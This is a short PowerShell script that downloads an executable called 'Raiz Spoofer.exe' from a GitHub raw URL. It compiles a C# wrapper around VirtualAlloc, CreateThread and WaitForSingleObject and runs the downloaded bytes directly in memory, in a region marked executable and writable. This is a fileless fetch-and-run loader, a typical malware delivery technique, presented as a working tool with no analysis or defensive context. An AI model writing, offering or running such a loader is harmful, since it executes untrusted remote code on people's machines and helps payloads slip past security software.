
$url = "https://raw.githubusercontent.com/tyu0720gyi/service/main/Raiz%20Spoofer.exe"

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public class NativeLoader {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public static void Execute(byte[] buffer) {
        // Allocate Memory with Execute/Read/Write permissions
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)buffer.Length, 0x3000, 0x40);
        Marshal.Copy(buffer, 0, mem, buffer.Length);

        uint threadId;
        // Create a thread starting at the beginning of the buffer
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
"@

try {
    Write-Host "[*] Downloading C++ Binary..." -ForegroundColor Cyan
    $wc = New-Object System.Net.WebClient
    $exeBytes = $wc.DownloadData($url)

    Write-Host "[*] Mapping Native PE to Memory..." -ForegroundColor Cyan
    # Compile the C# wrapper for Win32 APIs
    Add-Type -TypeDefinition $NativeCode
    
    Write-Host "[+] Starting Native Execution..." -ForegroundColor Green
    [NativeLoader]::Execute($exeBytes)
}
catch {
    Write-Host "[-] Critical Error: $($_.Exception.Message)" -ForegroundColor Red
}
